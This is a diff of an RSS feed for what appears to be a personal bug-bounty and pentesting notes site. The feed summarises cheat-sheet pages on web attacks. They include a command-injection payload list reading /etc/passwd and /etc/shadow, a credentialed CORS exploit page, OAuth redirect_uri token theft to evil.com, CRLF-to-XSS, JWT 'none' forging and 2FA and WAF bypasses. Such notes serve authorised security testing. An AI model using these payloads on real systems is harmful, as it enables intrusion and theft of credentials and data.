@@ -1,126 +1,116 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Introduction on caon.io</title>
-    <link>https://caon.io/</link>
-    <description>Recent content in Introduction on caon.io</description>
+    <title>Welcome to caon.io on caon.io</title>
+    <link>http://localhost/</link>
+    <description>Recent content in Welcome to caon.io on caon.io</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en</language><atom:link href="https://caon.io/index.xml" rel="self" type="application/rss+xml" />
+    <language>en</language>
+    <lastBuildDate>Mon, 29 Jan 2024 18:41:53 -0300</lastBuildDate><atom:link href="http://localhost/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title></title>
-      <link>https://caon.io/bb/impacts/</link>
+      <link>http://localhost/bb/impacts/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/bb/impacts/</guid>
-      <description>Impacts # SQLi # Attacker can obtain full database access holding private user information and other sensitive data. An attacker can use information gathered in SQLi to login in admin panels and obtain access to private and sensitive information.
-XSS # Successful exploitation of a XSS allows an attacker to execute arbitrary JavaScript code in the victim’s browser, allowing the attacker to steal cookies, tokens, or any other sensitive information.</description>
+      <guid>http://localhost/bb/impacts/</guid>
+      <description>Impacts SQLi Attacker can obtain full database access holding private user information and other sensitive data. An attacker can use information gathered in SQLi to login in admin panels and obtain access to private and sensitive information.
+XSS Successful exploitation of a XSS allows an attacker to execute arbitrary JavaScript code in the victim’s browser, allowing the attacker to steal cookies, tokens, or any other sensitive information. It is also possible to inject code into the page, allowing the possibility of phishing attacks, redirects, and code manipulation.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/403bypass/</link>
+      <link>http://localhost/exploitation/auth/2fa/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/403bypass/</guid>
-      <description> 403 Bypass # # https://github.com/laluka/bypass-url-parser python3 bypass-url-parser.py --url target.com # https://github.com/devploit/dontgo403 dontgo403 -u https://example.com </description>
+      <guid>http://localhost/exploitation/auth/2fa/</guid>
+      <description>Bypasses Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp Open ID acr_values can be manipulated as peeer RFC.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/auths/jwt/</link>
+      <link>http://localhost/exploitation/auth/jwt/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/auths/jwt/</guid>
-      <description>JWT # Change algorithm to None # Sometimes APIs don&amp;rsquo;t check for JWT encryption. None algorithm allows an attacker to craft a malicious JWT token to escalate privileges.
+      <guid>http://localhost/exploitation/auth/jwt/</guid>
+      <description>Change algorithm to None Sometimes APIs don&amp;rsquo;t check for JWT encryption. None algorithm allows an attacker to craft a malicious JWT token to escalate privileges.
 B64 None: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
-JWT Injection # Sometimes applications reflect data that is stored inside the token, try to create accounts with malicious payloads
-Crack JWTs # https://github.com/mazen160/jwt-pwn</description>
+JWT Injection Sometimes applications reflect data that is stored inside the token, try to create accounts with malicious payloads
+Crack JWTs https://github.com/mazen160/jwt-pwn</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/auths/oauth/</link>
+      <link>http://localhost/exploitation/auth/oauth/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/auths/oauth/</guid>
-      <description>OAuth 2 # Grabbing OAuth Token via redirect_uri # Redirect to a controlled domain to get the access token.
+      <guid>http://localhost/exploitation/auth/oauth/</guid>
+      <description>Grabbing OAuth Token via redirect_uri Redirect to a controlled domain to get the access token.
 https://www.example.com/signin/authorize?[...]&amp;amp;redirect_uri=https://localhost.evil.com OAuth implementations should never whitelist entire domains, only a few URLs so that &amp;ldquo;redirect_uri&amp;rdquo; can’t be pointed to an Open Redirect
 Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
-https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery # Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
+https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redirect_uri=https://evil.com Cross-Site Request Forgery Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/auths/saml/</link>
+      <link>http://localhost/exploitation/auth/saml/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/auths/saml/</guid>
-      <description> SAML # https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf https://docs.google.com/presentation/d/1ngp3Mq8y2h2xwGKqkOhI1ePUQxvXTNO1Xhs1kaBJmqU/edit </description>
+      <guid>http://localhost/exploitation/auth/saml/</guid>
+      <description> Stuff https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf https://docs.google.com/presentation/d/1ngp3Mq8y2h2xwGKqkOhI1ePUQxvXTNO1Xhs1kaBJmqU/edit </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/auths/twofa/</link>
+      <link>http://localhost/exploitation/bypass/403/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/auths/twofa/</guid>
-      <description>Two factor Authentication # Bypasses # Response Manipulation (Intercept Response and change it to 200, falses to trues&amp;hellip;) 2FA Code Reusability 2FA Code Leakage in Response Password Reset Disable 2FA CSRF on 2FA Disabling Lack of Brute-Force Protection Clickjacking on 2FA Disabling Page Enabling 2FA doesn&amp;rsquo;t expire Previously active Sessions Bypass 2FA with null or 000000 Direct access to a page, jump 2FA process 2FA code based on timestamp Open ID # acr_values can be manipulated as peeer RFC.</description>
+      <guid>http://localhost/exploitation/bypass/403/</guid>
+      <description> 403 Bypass # https://github.com/laluka/bypass-url-parser python3 bypass-url-parser.py --url target.com # https://github.com/devploit/dontgo403 dontgo403 -u https://example.com </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cachepoisoning/</link>
+      <link>http://localhost/exploitation/bypass/waf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cachepoisoning/</guid>
-      <description>Cache Poisoning # Check if the server is caching requests. You can tell by looking the headers and looking for the words HIT OR DYNAMIC.
-Cloudflare caches content based on MIME type only. Akamai acceppts headers
-Trigger Cache # /profile.css /profile/nonexistent.css /profile?nonexistent /profile/x.jpeg?nonexistent /profile/.js /profile/;.js Add \: header Stored XSS # Find an endpoint that reflects content to page (cookies, parameter, headers..) and store it by poisoning the cache</description>
+      <guid>http://localhost/exploitation/bypass/waf/</guid>
+      <description>WAF Bypass Techniques Try to find real IP address instead of TLD domain, see IP history websites section
+Awesome WAF
+How to bypass wafs
+# https://github.com/vincentcox/bypass-firewalls-by-DNS-history bash bypass-firewalls-by-DNS-history.sh -d example.com # Tool to fuzz urls for waf bypasses # https://github.com/RedSection/pFuzz # A lot of options, see docs IP history websites https://whoisrequest.com/history/ https://viewdns.info/iphistory/ https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip https://securitytrails.com/domain/example.com/dns https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ Quick Techniques Given domain.com, try to subdomains that reflect the main application but are not protected:</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/clickjacking/</link>
+      <link>http://localhost/exploitation/cloud/aws/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/clickjacking/</guid>
-      <description> Clickjacking # Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
-A website is vulnerable if:
-X-Frame-Options is not set Check header presence with:
-https://securityheaders.com/ POC # &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/exploitation/cloud/aws/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/exploitation/cloud/aws/</guid>
-      <description>Amazon AWS # Cognito # AWS Cognito helps to authenticate users using amazon solutions, if identity pool is enabled it is possible to gather a temporary token
+      <guid>http://localhost/exploitation/cloud/aws/</guid>
+      <description>Amazon AWS Cognito AWS Cognito helps to authenticate users using amazon solutions, if identity pool is enabled it is possible to gather a temporary token
 https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963
-Found secrets? # Use those secrets in aws CLI
-Once inside, escalate your privileges # https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/
-Bucket Decloaker # https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368</description>
+Found secrets? Use those secrets in aws CLI
+Once inside, escalate your privileges https://dhiyaneshgeek.github.io/cloud/security/2022/06/23/aws-misconfigurations/
+Bucket Decloaker https://gist.github.com/fransr/a155e5bd7ab11c93923ec8ce788e3368</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cloud/azure/</link>
+      <link>http://localhost/exploitation/cloud/azure/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cloud/azure/</guid>
-      <description>Microsoft Azure # Azure Edge takeover # https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/
-Active Directory recon # az ad sp show --id &amp;lt;client_id&amp;gt;
+      <guid>http://localhost/exploitation/cloud/azure/</guid>
+      <description>Microsoft Azure Azure Edge takeover https://onetrick.io/2019/09/28/subdomain-takeover-for-azure-cdn/
+Active Directory recon az ad sp show --id &amp;lt;client_id&amp;gt;
 Sometimes ADs are configured as multi-tenants, allowing anyone to login into private tenants.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cloud/google/</link>
+      <link>http://localhost/exploitation/cloud/gcp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cloud/google/</guid>
-      <description>Google GCP # Google Identity # Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public
+      <guid>http://localhost/exploitation/cloud/gcp/</guid>
+      <description>Google GCP Google Identity Applications can use google identity to manage login, check all endpoints to see if admin only endpoint are public
 Hint: deleteAccount and signUp may be gold
 Documentation: https://developers.google.com/resources/api-libraries/documentation/identitytoolkit/v3/python/latest/identitytoolkit_v3.relyingparty.html
 Misconfigs in Google Identity POST /identitytoolkit/v3/relyingparty/signupNewUser?key=GOOGLEKEY HTTP/2 Host: www.googleapis.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 Accept: */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Client-Version: Firefox/JsCore/8.10.1/FirebaseCore-web X-Firebase-Locale: pt Content-Length: 81 {&amp;#34;returnSecureToken&amp;#34;:true,&amp;#34;email&amp;#34;:&amp;#34;asassa@asas.com&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;asassa@asas.com&amp;#34;} GET /v1/projects?key=GOOGLEKEY HTTP/2 Host: identitytoolkit.</description>
@@ -128,139 +118,163 @@ Misconfigs in Google Identity POST /identitytoolkit/v3/relyingparty/signupNewUse
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cms/drupal/</link>
+      <link>http://localhost/exploitation/cms/drupal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cms/drupal/</guid>
-      <description>Drupal # Drupal hacking guide Once inside, get RCE # Reverse Shel with admin access
-Content Discovery # Fuzz in example.com/node/FUZZ to find unmapped pages</description>
+      <guid>http://localhost/exploitation/cms/drupal/</guid>
+      <description>Drupal Drupal hacking guide Once inside, get RCE Reverse Shel with admin access
+Content Discovery Fuzz in example.com/node/FUZZ to find unmapped pages</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cms/others/</link>
+      <link>http://localhost/exploitation/cms/others/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cms/others/</guid>
-      <description>Joomla # joomscan Magento # magescan More # Look for CVEs under the CMS
+      <guid>http://localhost/exploitation/cms/others/</guid>
+      <description>Joomla joomscan Magento magescan More Look for CVEs under the CMS
 https://sploitus.com/</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cms/wordpress/</link>
+      <link>http://localhost/exploitation/cms/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cms/wordpress/</guid>
-      <description> Wordpress # Analyze WP plugins source code wpscan Check WP IP behind WAF Pro tip To maximize results, configure a key in wpscan. </description>
+      <guid>http://localhost/exploitation/cms/wordpress/</guid>
+      <description> Wordpress Analyze WP plugins source code wpscan Check WP IP behind WAF Pro tip To maximize results, configure a key in wpscan. </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/commandinjection/</link>
+      <link>http://localhost/exploitation/vulnerability/cachepoisoning/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/commandinjection/</guid>
-      <description>Command Injection # Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
+      <guid>http://localhost/exploitation/vulnerability/cachepoisoning/</guid>
+      <description> Cache Poisoning Check if the server is caching requests. You can tell by looking the headers and looking for the words HIT OR DYNAMIC.
+Cloudflare caches content based on MIME type only. Akamai acceppts headers
+Trigger Cache /profile.css /profile/nonexistent.css /profile?nonexistent /profile/x.jpeg?nonexistent /profile/.js /profile/;.js Add \: header Stored XSS Find an endpoint that reflects content to page (cookies, parameter, headers..) and store it by poisoning the cache
+List of cachable extensions 7z csv gif midi png tif zip avi doc gz mkv ppt tiff zst avif docx ico mp3 pptx ttf apk dmg iso mp4 ps webm bin ejs jar ogg rar webp bmp eot jpg otf svg woff bz2 eps jpeg pdf svgz woff2 class exe js pict swf xls css flac mid pls tar xlsx </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://localhost/exploitation/vulnerability/clickjacking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/exploitation/vulnerability/clickjacking/</guid>
+      <description> Clickjacking Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
+A website is vulnerable if:
+X-Frame-Options is not set Check header presence with:
+https://securityheaders.com/ POC &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://localhost/exploitation/vulnerability/commandinjection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/exploitation/vulnerability/commandinjection/</guid>
+      <description>Command Injection Command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
 &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/passwd&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/shadow&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/usr/bin/id;--&amp;amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(&amp;#39;cat%20/etc/passwd&amp;#39;) |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \n/bin/ls -al\n \n/usr/bin/id\n \nid\n \n/usr/bin/id; \nid; \n/usr/bin/id| \nid| ;/usr/bin/id\n ;id\n |usr/bin/id\n |nid\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; ;system(&amp;#39;id&amp;#39;) ;system(&amp;#39;/usr/bin/id&amp;#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A | id &amp;amp; id ; id %0a id %0a $;/usr/bin/id cat /etc/hosts $(`cat /etc/passwd`) cat /etc/passwd {{ get_user_file(&amp;#34;/etc/passwd&amp;#34;) }} &amp;lt;!</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cookieattacks/</link>
+      <link>http://localhost/exploitation/vulnerability/cookieattacks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cookieattacks/</guid>
-      <description>Cookie Based Attacls # Cookies Explained # https://cookiepedia.co.uk/
-Attacks # Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie # If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
+      <guid>http://localhost/exploitation/vulnerability/cookieattacks/</guid>
+      <description>Cookie Based Attacls Cookies Explained https://cookiepedia.co.uk/
+Attacks Check for PII or sensitive in cookie data Add a very long cookie value, it may ddos the application If cookies hold a serialized object, try insecure deserialization Chain CRLF Injection to add cookies (look for XSS or SQL) Check if session expires on logout Decoding the cookie If the cookie is using some Base encoding (like Base64) or similar you may be able to decode it, change the content and impersonate arbitrary users</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/cors/</link>
+      <link>http://localhost/exploitation/vulnerability/cors/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/cors/</guid>
-      <description>CORS # # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC # Simple # &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers # &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
+      <guid>http://localhost/exploitation/vulnerability/cors/</guid>
+      <description>CORS # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;#34;demo&amp;#34;&amp;gt; &amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;cors()&amp;#34;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;#34;demo&amp;#34;).innerHTML = this.responseText; } }; xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://&amp;lt;vulnerable-url&amp;gt;&amp;#34;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &amp;#39;Url&amp;#39;;//Paste here Url var params = &amp;#39;PostData&amp;#39;;//Paste here POST data http.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/crlf/</link>
+      <link>http://localhost/exploitation/vulnerability/crlf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/crlf/</guid>
-      <description> CRLF # Carriage Return Line Feed
-Carriage Return = ASCII 13, \r, %0D Line Feed = ASCII 10, \n, %0A Tools # # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;#34;http://example.com&amp;#34; POC # CRLF to XSS
+      <guid>http://localhost/exploitation/vulnerability/crlf/</guid>
+      <description> CRLF Carriage Return Line Feed
+Carriage Return = ASCII 13, \r, %0D Line Feed = ASCII 10, \n, %0A Tools # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;#34;http://example.com&amp;#34; POC CRLF to XSS
 http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/csrf/</link>
+      <link>http://localhost/exploitation/vulnerability/csrf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/csrf/</guid>
-      <description>CSRF # Conditions to exploit an useful CSRF # Revelant action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find # Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request and call manually Extract the token with XSS or HTML injection Articles # URL Description What is CRSF Part #1 Why CORS makes CSRf impossible Part #2 Generate POCs # In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc URL Description https://pentestbook.</description>
+      <guid>http://localhost/exploitation/vulnerability/csrf/</guid>
+      <description>CSRF Conditions to exploit an useful CSRF Revelant action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters How to find Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request and call manually Extract the token with XSS or HTML injection Articles URL Description What is CRSF Part #1 Why CORS makes CSRf impossible Part #2 Generate POCs In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc URL Description https://pentestbook.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/deserialization/</link>
+      <link>http://localhost/exploitation/vulnerability/deserialization/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/deserialization/</guid>
-      <description> Deseralization # Java # https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class </description>
+      <guid>http://localhost/exploitation/vulnerability/deserialization/</guid>
+      <description> Deseralization Java https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/hostheaderinjection/</link>
+      <link>http://localhost/exploitation/vulnerability/hostheaderinjection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/hostheaderinjection/</guid>
-      <description>Host Header Attacks # Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
-Business Logic flaws Cache poisoning Attack Vectors # Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.</description>
+      <guid>http://localhost/exploitation/vulnerability/hostheaderinjection/</guid>
+      <description>Host Header Attacks Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
+Business Logic flaws Cache poisoning Attack Vectors Premise: An websites allows an user to remember his passwords by requesting a reset email. Attack vector: An attacker request the reset for an email that the knows the application exists, he intercepts the request and adds a host X-Forwarded-For: evil.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/idor/</link>
+      <link>http://localhost/exploitation/vulnerability/idor/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/idor/</guid>
-      <description>IDOR # Basically try to screw with evertything.
-Burp filter # (?i)\b\w*id\b(?!\w)\s*=\s*(&amp;quot;[^&amp;quot;]*&amp;quot;|&#39;[^&#39;]*&#39;|[^&amp;amp;\s}]*)
-Add parameters into the endpoints # GET /api_v1/messages --&amp;gt; 401 GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution # GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: # POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! # /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions # /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
+      <guid>http://localhost/exploitation/vulnerability/idor/</guid>
+      <description>IDOR Basically try to screw with evertything.
+Burp filter (?i)\b\w*id\b(?!\w)\s*=\s*(&amp;quot;[^&amp;quot;]*&amp;quot;|&#39;[^&#39;]*&#39;|[^&amp;amp;\s}]*)
+Add parameters into the endpoints GET /api_v1/messages --&amp;gt; 401 GET /api_v1/messages?user_id=victim_uuid --&amp;gt; 200 HTTP Parameter pollution GET /api_v1/messages?user_id=VICTIM_ID --&amp;gt; 401 Unauthorized GET /api_v1/messages?user_id=ATTACKER_ID&amp;amp;user_id=VICTIM_ID --&amp;gt; 200 OK GET /api_v1/messages?user_id=YOUR_USER_ID[]&amp;amp;user_id=ANOTHER_USERS_ID[] JSON Parameter Pollution: POST /api/get_profile Content-Type: application/json {“user_id”:&amp;lt;legit_id&amp;gt;,”user_id”:&amp;lt;victim’s_id&amp;gt;} Add .json to the endpoint, if it is built in Ruby! /user_data/2341 --&amp;gt; 401 Unauthorized /user_data/2341.json --&amp;gt; 200 OK Test on outdated API Versions /v3/users_data/1234 --&amp;gt; 403 Forbidden /v1/users_data/1234 --&amp;gt; 200 OK Wrap the ID with an array.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/IIS/</link>
+      <link>http://localhost/exploitation/vulnerability/IIS/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/IIS/</guid>
-      <description> IIS # Shortscan # https://github.com/bitquark/shortscan
+      <guid>http://localhost/exploitation/vulnerability/IIS/</guid>
+      <description> IIS Shortscan https://github.com/bitquark/shortscan
 $ shortscan http://example.org/ </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/exploitation/lfi/</link>
+      <link>http://localhost/exploitation/vulnerability/lfi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/exploitation/lfi/</guid>
-      <description>LFI/RFI # # https://github.com/kurobeats/fimap fimap -u &amp;#34;https://example.com?test=&amp;#34; Wget # Sometimes browsers mess around with basic directory traversal sequences, but wget may work:
